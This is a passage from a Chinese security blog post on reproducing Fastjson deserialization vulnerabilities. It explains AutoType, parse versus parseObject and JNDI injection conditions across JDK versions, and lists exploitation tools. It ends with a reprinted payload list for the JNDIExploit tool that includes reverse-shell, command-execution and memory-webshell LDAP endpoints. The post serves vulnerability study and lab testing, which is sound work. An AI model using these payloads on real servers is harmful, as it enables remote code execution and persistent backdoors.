<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Fastjson反序列化漏洞复现, Yang Hao&#39;s blog">
    <meta name="description" content="Yang Hao&#39;s blog">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->

<script async src="https://www.googletagmanager.com/gtag/js?id=G-KYC8PY5RS4"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'G-KYC8PY5RS4');
</script>


    <title>Fastjson反序列化漏洞复现 | Yang Hao&#39;s blog</title>
    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/favicon.ico">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/lightGallery/css/lightgallery.min.css">
	
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/css/matery.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/css/my.css">
	
	<!--prism-->
	<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/prism/prism.css">
    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/prism/prism.js" async ></script>


    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/jquery/jquery.min.js"></script>
	<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/live2d-widget/autoload.js"></script>
<meta name="generator" content="Hexo 5.4.2">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Yang Hao's blog" type="application/atom+xml">
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Yang Hao&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="javascript:void(0);" class="waves-effect waves-light">

      
      <i class="fas fa-list" style="zoom: 0.6;"></i>
      
      <span>文章</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/tags">
          
          <i class="fas fa-tags" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>标签</span>
        </a>
      </li>
      
      <li>
        <a href="/categories">
          
          <i class="fas fa-bookmark" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>分类</span>
        </a>
      </li>
      
      <li>
        <a href="/archives">
          
          <i class="fas fa-archive" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>归档</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Yang Hao&#39;s blog</div>
        <div class="logo-desc">
            
            Yang Hao&#39;s blog
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-list"></i>
			
			文章
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/tags " style="margin-left:50px">
				  
				   <i class="fa fas fa-tags" style="position: absolute;left:28px" ></i>
			      
		          <span>标签</span>
                  </a>
                </li>
              
                <li>

                  <a href="/categories " style="margin-left:50px">
				  
				   <i class="fa fas fa-bookmark" style="position: absolute;left:28px" ></i>
			      
		          <span>分类</span>
                  </a>
                </li>
              
                <li>

                  <a href="/archives " style="margin-left:50px">
				  
				   <i class="fa fas fa-archive" style="position: absolute;left:28px" ></i>
			      
		          <span>归档</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/featureimages/11.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Fastjson反序列化漏洞复现</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Fastjson/">
                                <span class="chip bg-color">Fastjson</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
                                漏洞复现
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2024-08-18
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2024-12-10
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    22.6k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    111 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Fastjson 是阿里巴巴开源的一个高性能 JSON 库，广泛应用于 Java 应用中进行 JSON 数据的解析和序列化。然而，由于其功能强大且支持多种 Java 对象的自动反序列化，Fastjson 在历史上多次暴露出严重的安全漏洞，特别是反序列化漏洞。此类漏洞允许攻击者通过精心构造的恶意 JSON 数据包，实现对目标系统的远程代码执行（RCE），从而在未经授权的情况下控制受害者的服务器。本文通过学习<code>fastjson</code>的基础知识，整理了一些公开的Payload，并搭建实验环境进行测试。</p>
<h2 id="0x02-Fastjson相关介绍"><a href="#0x02-Fastjson相关介绍" class="headerlink" title="0x02 Fastjson相关介绍"></a>0x02 Fastjson相关介绍</h2><p>Fastjson是阿里巴巴的开源JSON解析库，它是由Java语言编写的JSON处理器/解析器。Fastjson提供了一种快速、高效的方式来处理JSON数据，可以将Java对象转换为JSON格式的数据，也可以将JSON格式的数据转换为Java对象。Fastjson具有高性能和低内存占用的特点，在Java开发中被广泛应用于处理JSON数据。</p>
<p>FastJson因为Auto功能存在缺陷的原因，历史上出现过多次安全漏洞，目前官方针对<code>FastJson</code>的各种历史问题经过重构将其升级到了<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson2">fastjson2</a>，在fastjson2中提到升级的原因之一是安全性的提升:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240422111207276.png"></p>
<p>fastjson2中完全删除<code>autoType</code>了白名单，且默认关闭<code>autoType</code>功能。在fastjson1项目中反序列化漏洞产生的根本原因就是对<code>autoType</code>功能利用和限制绕过，攻击者可以通过精心构造的类和数据包进行命令执行。</p>
<h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><p>为了理解反序列化漏洞，先来解释下序列化和反序列化。在Java中，序列化是将对象转换为字节序列的过程，这些字节可以被保存到磁盘或数据库，也可以通过流进行发送，序列化通常用于通信（在多个主机之间共享对象）和持久性（将对象状态存储在文件或数据库中）。而从字节序列创建对象的反向过程则称为反序列化。在fastjson中使用序列化和反序列化进行对象和JSON字符串的转换如下:</p>
<pre><code class="line-numbers language-java">import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.IOException;
public class Main {
    public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("张三", 40,1);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"name\":\"李四\",\"age\":55,\"sex\":1 }";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println("name:" + person2.name + " sex:"+ person2.getSex() + " age:"+person2.getAge());
        return ;
    }
    // 定义一个类
    public static class Person {
        private String name;private int age;private int sex;
        public Person(String name, int age,int sex) {
            this.name = name;this.age = age;this.sex = sex;
        }
        public String getName() {return name;}
        public int getAge() {return age;}
        public int getSex() {return sex;}
    }
}
</code></pre>
<p>执行代码后，第一次输出将对象转为了JSON字符串，第二次将JSON字符串反序列化为了对象并输出了对象的属性:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240423173312776.png"></p>
<p>FastJSON 在序列化和反序列化时，会根据 getter 和 setter 方法来操作对象的属性（在 Java 中，setter 和 getter 是一种常见的编程模式，即通过反射的方式对类的属性进行读取和设置操作），下面的示例可以验证这一点:</p>
<pre><code class="line-numbers language-java">import com.alibaba.fastjson.JSON;
public class Main {
    public static void main(String[] args) {
        // 创建一个 Person 对象
        Person person = new Person();
        person.setName("Alice");
        person.setAge(30);

        // 序列化对象为 JSON 字符串
        String jsonString = JSON.toJSONString(person);
        System.out.println("Serialized JSON: " + jsonString);

        // 反序列化 JSON 字符串为对象
        Person newPerson = JSON.parseObject(jsonString, Person.class);

        // 打印反序列化后的对象属性值
        System.out.println("Deserialized Person:");
        System.out.println("Name: " + newPerson.getName());
        System.out.println("Age: " + newPerson.getAge());
    }

    public static class Person {
        private String name;
        private int age;

        // Getter 方法
        public String getName() {
            System.out.println("getName");
            return name;
        }

        // Setter 方法
        public void setName(String name) {
            System.out.println("setName");
            this.name = name;
        }

        // Getter 方法
        public int getAge() {
            return age;
        }

        // Setter 方法
        public void setAge(int age) {
            this.age = age;
        }
    }
}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240424003548130.png"></p>
<h3 id="Autotype功能"><a href="#Autotype功能" class="headerlink" title="Autotype功能"></a>Autotype功能</h3><p><code>fastjson</code> 的 <code>AutoType</code> 功能是在 1.2.22 版本引入的。<code>AutoType</code> 允许在反序列化过程中自动识别和实例化指定类型的对象，这是通过在 JSON 数据中嵌入类型信息来实现的。然而，这一功能也带来了安全风险，尤其是在未经验证的输入情况下，可能导致反序列化漏洞，允许攻击者执行任意代码。由于这些安全风险，后续版本开发者和安全研究人员对<code>AutoType</code>功能进行了多次修复和修复绕过的攻防对抗。</p>
<p>为了理解<code>autotype</code>的作用，编写如下代码，代码定义了一个名为 <code>Person</code> 的静态内部类，以及一个名为 <code>City</code> 的接口和一个实现了 <code>City</code> 接口的静态内部类 <code>Home</code>，<code>fastjson</code>在对这样的类进行序列化和反序列化结果如下:</p>
<pre><code>import com.alibaba.fastjson.JSON;
public class Main {
    public static void main(String[] args) {
        // 创建一个 Person 对象
        Person person = new Person();
        person.setName("Alice");
        person.setAge(30);

        Home home = new Home();
        home.setCityname("chengdu");
        person.setCity(home);

        // 序列化对象为 JSON 字符串
        String jsonString = JSON.toJSONString(person);
        System.out.println("Serialized JSON: " + jsonString);

        // 反序列化 JSON 字符串为对象
        Person newPerson = JSON.parseObject(jsonString, Person.class);

        // 打印反序列化后的对象属性值
        System.out.println("Deserialized Person:");
        // 这里转换时，不知道Home类型是哪里来的，强制转换就会失败
        Home newHome =  (Home) newPerson.getCity();
        System.out.println("newHome : " + newHome);
        System.out.println("Name: " + newPerson.getName());
        System.out.println("Age: " + newPerson.getAge());
    }

    public static class Person {
        private String name;
        private int age;
        private City city;

        public City getCity() {
            System.out.println("getcity");
            return city;
        }

        // Getter 方法
        public String getName() {
            System.out.println("getName");
            return name;
        }

        // Setter 方法
        public void setName(String name) {
            System.out.println("setName");
            this.name = name;
        }

        // Getter 方法
        public int getAge() {
            return age;
        }

        // Setter 方法
        public void setAge(int age) {
            this.age = age;
        }

        public void setCity(City city) {
            this.city = city;
        }
    }


    interface City {

    }

    static class Home implements City {
        private String cityname;

        public String getCityname() {
            return cityname;
        }

        public void setCityname(String cityname) {
            this.cityname = cityname;
        }
    }
}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240424010257053.png"></p>
<p>序列化字符串中的<code>"city":{"cityname":"chengdu"}</code>应该是<code>Home</code>类型，但是<code>fastjson</code>并没有成功转换，抛出了异常。为了解决这个问题，<code>fastjson</code>引入了<code>autotype</code>功能，利用该功能在序列化时标记类对应的原始类型，指定具体的解析类:</p>
<pre><code class="line-numbers language-java">import com.alibaba.fastjson.serializer.SerializerFeature;
//使用 SerializerFeature.WriteClassName
String jsonString = JSON.toJSONString(person, SerializerFeature.WriteClassName);
</code></pre>
<p>这样序列化的JSON字符串就会带上<code>@type</code>指定需要转换的类型:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240424093917809.png"></p>
<p>当 autotype 功能启用时，Fastjson会尝试根据 JSON 字符串中的类型信息（即 @type 的值）来自动转换为相应的Java对象类型，同时 Fastjson 基于 setter/getter 的转换方式可以在转换类型时设置对象的参数，这就导致可以引入未经授权的类实例化、执行恶意代码或获取系统权限的安全风险。在FastJson漏洞的利用过程中一般是利用目标类执行JNDI注入、指定字节码加载、文件写入等。</p>
<h3 id="parseObject和parse"><a href="#parseObject和parse" class="headerlink" title="parseObject和parse"></a>parseObject和parse</h3><p>在 Fastjson 中，有两种反序列化接口可供使用：<code>JSON.parse</code> 和 <code>JSON.parseObject</code>。其中，<code>JSON.parseObject</code> 会自动扫描类中的 getter 方法，并根据 JSON 字符串中的属性值自动匹配 setter 方法来设置对象的属性值。因此，使用 <code>JSON.parseObject</code> 方法可以方便地将 JSON 字符串转换为相应的 Java 对象，无需手动转换类型。相反，<code>JSON.parse</code> 方法不会自动扫描 getter 方法，而是将 JSON 字符串直接解析为一个 <code>JSONObject</code> 对象或其他 JSON 数据类型。因此，<code>JSON.parse</code> 方法返回的是一个 <code>Object</code> 类型的对象，如果需要将其转换为特定的 Java 对象类型，则需要手动进行类型转换。强制类型转换可能会导致 <code>ClassCastException</code> 异常。如下代码进使用<code>JSON.parse</code>转换数据类型时会导致异常:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240423232856916.png"></p>
<p>这时候需要手动对<code>JSON.parse</code>类型进行转换:</p>
<pre><code>import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class Main {
    public static void main(String[] args) {
        // 示例 JSON 字符串
        String jsonString = "{\"name\":\"John\",\"age\":30,\"city\":{\"name\":\"New York\",\"population\":1000000}}";
        //1. 使用 JSON.parse() 方法解析 JSON 字符串
        Object jsonObject = JSON.parse(jsonString);
        // 手动转换为 Person 对象  // JSON.parse 不会执行 getter 不知道具体类型，需要手动转换
        Person person = convertToObject(jsonObject);
        // 输出 Person 对象的信息
        System.out.println("Name: " + person.getName());
        System.out.println("Age: " + person.getAge());
        System.out.println("City: " + person.getCity().getName());
        System.out.println("City Population: " + person.getCity().getPopulation());
    }

    // 手动转换方法
    private static Person convertToObject(Object jsonObject) {
        if (jsonObject instanceof Person) {
            return (Person) jsonObject;
        } else if (jsonObject instanceof com.alibaba.fastjson.JSONObject) {
            com.alibaba.fastjson.JSONObject json = (com.alibaba.fastjson.JSONObject) jsonObject;
            String name = json.getString("name");
            int age = json.getIntValue("age");
            com.alibaba.fastjson.JSONObject cityJson = json.getJSONObject("city");
            City city = new City(cityJson.getString("name"), cityJson.getIntValue("population"));
            return new Person(name, age, city);
        } else {
            throw new IllegalArgumentException("Unsupported JSON object type");
        }
    }

    // Person 类
    public static class Person {
        private String name;private int age; private City city;
        public Person(String name, int age, City city) {this.name = name;this.age = age;this.city = city;  }
        public String getName() {  return name;}
        public int getAge() { return age; }
        public City getCity() { return city; }
    }

    // City 类
    public static class City {
        private String name;
        private int population;
        public City(String name, int population) {this.name = name; this.population = population;}
        public String getName() { return name; }
        public int getPopulation() {return population;}
    }
}
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240423234159608.png"></p>
<p>使用<code>JSON.parseObject()</code> 方法时则可以返回指定类型的 Java 对象:</p>
<pre><code class="line-numbers language-java">Person person2 = JSON.parseObject(jsonString,Person.class);
</code></pre>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240423234628481.png"></p>
<p>这是因为<code>JSON.parse</code>不自动扫描<code>getter/setter</code>，而<code>JSON.parseObject</code>在执行时会自动调用符合条件的函数(无参数的构造函数、符合条件的getter/setter函数)。<code>JSON.parse</code>在漏洞利用时相比<code>JSON.parseObject</code>有一些难度。不过在<code>fastjson</code>1.2.36版本以后可以利用<code>$ref</code>的方式来调用任意<code>getter</code>，可参考<a target="_blank" rel="noopener" href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6">一种利用$ref几乎任意getter触发的方法</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/HongYu012/article/details/123090337">浅谈fastjson反序列化漏洞_tojsonstring大小限制-CSDN博客</a>、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAwNzk0NTkxNw==&amp;mid=2247486057&amp;idx=1&amp;sn=6799b8b77f058247705beaa6995dcb82&amp;chksm=9b7721bbac00a8adc3ca7b23590bcb7493fc93091eaf76efe4662b7d6f86068e38d20338c3c1&amp;mpshare=1&amp;scene=2&amp;srcid=1109kLt9Pm0fZdiqQ8zbB0IX&amp;sharer_sharetime=1667995572392&amp;sharer_shareid=917ce1404b071ce27556675ad135266f#rd">Java安全攻防之老版本Fastjson的一些不出网利用</a>中有关<code>$ref</code>的介绍。</p>
<h3 id="JDNI注入简介"><a href="#JDNI注入简介" class="headerlink" title="JDNI注入简介"></a>JDNI注入简介</h3><p>在JAVA程序中，JNDI注入是在代码中存在可控的JNDI字符串的情况。这意味着攻击者可以控制JNDI名称，进而构造恶意的RMI（远程方法调用）或LDAP（轻量级目录访问协议）服务端，导致远程服务器加载恶意类，最终实现远程代码执行。恶意类即对<code>JAVA</code>源码进行编译生成的<code>.class</code>文件，除了使用工具现有的恶意类，也可以根据需要自行开发代码进行利用。</p>
<p>JNDI 注入攻击通常涉及识别可控的 JNDI 注入点( <code>lookup()</code>过程中寻找类加载)、部署恶意的 RMI 服务器并编写恶意的类、构造恶意的 JNDI 引用，并最终触发漏洞以执行恶意操作。</p>
<p>在目标环境存在JNDI注入点、可以访问远程服务的情况下，还需要根据JDK版本进行不同的利用方式，在<a target="_blank" rel="noopener" href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">如何绕过高版本JDK的限制进行JNDI注入利用 – KINGX</a>一文中详细列举了这些版本差异和利用方式。这里简单进行了整理，主要有下列分类:</p>
<p><strong>RMI Remote Object Payload</strong></p>
<pre><code>在条件允许的情况下可通过HTTP/FTP/SMB等方式加载远程对象类执行，利用条件如下:
1.RMI客户端的上下文环境允许访问远程Codebase(一个指定jvm搜索类的地址)；
2.在client端需要安装RMISecurityManager并且配置java.security.policy
3.JDK 6u45、JDK 7u21 之前版本,属性java.rmi.server.useCodebaseOnly值为false(之前版本默认为false。如果为 true，将禁用自动加载远程类文件)。

Changelog:
JDK 6u45 https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html
JDK 7u21 http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html
</code></pre>
<p><strong>RMI + JNDI Reference Payload</strong></p>
<pre><code>通过RMI协议访问远程对象 (rmi://)
1.允许从远程的Codebase加载Reference工厂类(实现了ObjectFactory接口的类通常被称为工厂类，工厂类负责根据提供的参数创建并返回适当类型的对象实例。);
2.JDK 6u141, JDK 7u131, JDK 8u121 之前版本。

Changelog:
JDK 6u141 http://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141
JDK 7u131 http://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html
JDK 8u121 http://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html
</code></pre>
<p><strong>LDAP + JNDI Reference Payload</strong> </p>
<pre><code>通过ladp协议访问远程对象 (ldap://)
1.允许从远程的Codebase加载Reference工厂类;
2.Oracle JDK 11.0.1、8u191、7u201、6u211 之前版本。

Changelog: com.sun.jndi.ldap.object.trustURLCodebase = false
https://gist.github.com/shipilev/cfbe09a31ac32f0cc51078db7898c797
</code></pre>
<p><strong>绕过高版本JDK限制进行JNDI注入</strong></p>
<pre><code class="line-numbers language-tex">JDK高版本中，trustURLCodebase默认设置为false，禁止加载远程ObjectFactory。绕过高版本JDK限制进行JNDI注入:
1.利用本地Class作为Reference Factory
这种利用方式需要本地存在存在可利用的工厂类，这个工厂类必须在受害目标本地的CLASSPATH中。
已知存在下列可利用环境:Tomcat 8+ or SpringBoot 1.2.x+、Tomcat and Groovy、WebSphere v6-v9

2.利用LDAP返回序列化数据，触发本地Gadget

3.相关的利用工具
https://github.com/wyzxxz/jndi_tool
https://github.com/mbechler/marshalsec
https://github.com/feihong-cs/JNDIExploit
https://github.com/veracode-research/rogue-jndi
https://github.com/cckuailong/JNDI-Injection-Exploit-Plus

4.参考链接
https://xz.aliyun.com/t/10829
https://github.com/kezibei/Urldns
https://www.cnblogs.com/bitterz/p/15946406.html
</code></pre>
<h3 id="漏洞相关工具介绍"><a href="#漏洞相关工具介绍" class="headerlink" title="漏洞相关工具介绍"></a>漏洞相关工具介绍</h3><h4 id="JNDI-Injection-Exploit-Plus"><a href="#JNDI-Injection-Exploit-Plus" class="headerlink" title="JNDI-Injection-Exploit-Plus"></a><strong><a target="_blank" rel="noopener" href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus">JNDI-Injection-Exploit-Plus</a></strong></h4><p><code>JNDI-Injection-Exploit-Plus</code>是一款JNDI注入利用工具，可以生成JNDI链接并启动后端相关服务。通过这个工具也可以看到其包括了上文介绍的几种类型的Pyload，主要利用<code>Remote JNDI Reference Payload</code>、<code>Local JNDI Reference Payload</code>和本地反序列化利用链三种方式进行命令执行:</p>
<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240513150523571.png"></p>
<h4 id="JNDIExploit"><a href="#JNDIExploit" class="headerlink" title="JNDIExploit"></a><strong><a target="_blank" rel="noopener" href="https://github.com/WhiteHSBG/JNDIExploit">JNDIExploit</a></strong></h4><p><code>JNDIExploit</code>  是一款用于 <code>JNDI注入</code> 利用的工具，包含命令执行、命令执行回显、反弹Shell、内存马等多种利用方式的载荷，可以使用<code>java -jar JNDIExploit.jar -u</code>查看载荷细节:</p>
<pre><code>[+] Basic Queries: ldap://0.0.0.0:1389/Basic/[PayloadType]/[Params], e.g.
ldap://0.0.0.0:1389/Basic/Dnslog/[domain]
ldap://0.0.0.0:1389/Basic/Command/[cmd]
ldap://0.0.0.0:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://0.0.0.0:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported
ldap://0.0.0.0:1389/Basic/TomcatEcho
ldap://0.0.0.0:1389/Basic/SpringEcho
ldap://0.0.0.0:1389/Basic/WeblogicEcho
ldap://0.0.0.0:1389/Basic/TomcatMemshell1
ldap://0.0.0.0:1389/Basic/TomcatMemshell2  ---need extra header [shell: true]
ldap://0.0.0.0:1389/Basic/TomcatMemshell3  /ateam  pass1024     [推荐使用]
ldap://0.0.0.0:1389/Basic/GodzillaMemshell /bteam.ico pass1024  [推荐使用]
ldap://0.0.0.0:1389/Basic/JettyMemshell
ldap://0.0.0.0:1389/Basic/WeblogicMemshell1
ldap://0.0.0.0:1389/Basic/WeblogicMemshell2
ldap://0.0.0.0:1389/Basic/JBossMemshell
ldap://0.0.0.0:1389/Basic/WebsphereMemshell
